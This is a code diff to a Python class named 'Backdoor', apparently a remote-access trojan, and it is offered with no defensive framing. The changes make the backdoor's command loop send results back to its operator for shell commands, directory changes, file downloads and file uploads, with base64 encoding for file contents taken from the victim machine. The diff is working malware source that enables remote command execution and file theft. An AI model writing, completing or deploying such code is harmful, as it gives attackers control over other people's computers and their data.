@@ -32,7 +32,7 @@ class Backdoor:
 
     def read_file(self, path):
         with open(path, "rb") as file:
-            return base64.b64encode(file.read())
+            return base64.b64encode(file.read()).decode()
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
@@ -47,13 +47,16 @@ class Backdoor:
                 exit()
             elif command[0] == "cd" and len(command) > 1:
                 command_result = self.change_working_directory_to(command[1])
+                self.reliable_send(command_result)
             elif command[0] == "download":
                 command_result = self.read_file(command[1])
+                self.reliable_send(command_result)
             elif command[0] == "upload":
                 command_result = self.write_file(command[1], command[2])
+                self.reliable_send(command_result)
             else:
                 try:
-                    command_result = self.execute_system_command(command)
+                    command_result = self.execute_system_command(command).decode()
                 except Exception:
                     command_result = "[-] Error executing command"
                 self.reliable_send(command_result)
